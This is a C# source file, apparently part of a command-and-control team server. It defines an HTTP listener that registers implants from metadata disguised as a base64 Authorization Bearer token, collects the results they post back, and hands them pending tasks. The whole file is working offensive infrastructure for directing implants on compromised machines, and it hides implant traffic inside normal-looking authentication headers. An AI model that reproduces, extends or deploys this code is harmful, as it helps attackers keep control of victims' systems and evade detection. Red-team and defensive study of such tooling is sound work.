

using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using TeamServer.Models.Agents;
using TeamServer.Services;

using System.Text;

namespace TeamServer.Models.Listeners
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public async Task<IActionResult> HandleImplant()
        {

            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            var agent = _agents.GetAgent(metadata.Id);

            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            agent.CheckIn();

            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                {
                    json = await sr.ReadToEndAsync();
                }

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                agent.AddTaskResults(results);
            }
            
            
            
            
            
            var tasks = agent.GetPendingTasks();

            return Ok(tasks);
        }


        private AgentMetadata? ExtractMetadata(IHeaderDictionary header)
        {
            if (!header.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // Authorization: Bearer base64
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);
            try
            {
                byte[] arr = Convert.FromBase64String(encodedMetadata);

                var json = Encoding.UTF8.GetString(arr);
                return JsonConvert.DeserializeObject<AgentMetadata>(json);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return null;
        }

    }
}
